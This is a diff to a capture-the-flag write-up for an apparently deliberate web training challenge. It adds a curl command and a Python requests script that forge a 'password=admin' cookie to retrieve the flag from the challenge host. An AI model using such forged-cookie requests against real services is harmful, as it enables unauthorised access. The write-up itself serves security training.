@@ -27,7 +27,20 @@ if __name__ == "__main__":
     app.run(host="0.0.0.0", debug=True)
 ```
 * according to the code, if there is a `password` cookie in the GET request with the value `admin`, then the flag is returned in the response
+## Curl
 * this curl command will complete the challenge:
 ```
 curl -b "password=admin" -v http://web-05.challs.olicyber.it/flag
+```
+## Python
+```
+import requests
+
+URL = 'http://web-05.challs.olicyber.it/flag'
+
+my_cookies = {'password': 'admin'}
+
+get_req = requests.get(URL, cookies=my_cookies)
+req_text = get_req.text
+print(req_text)
 ```
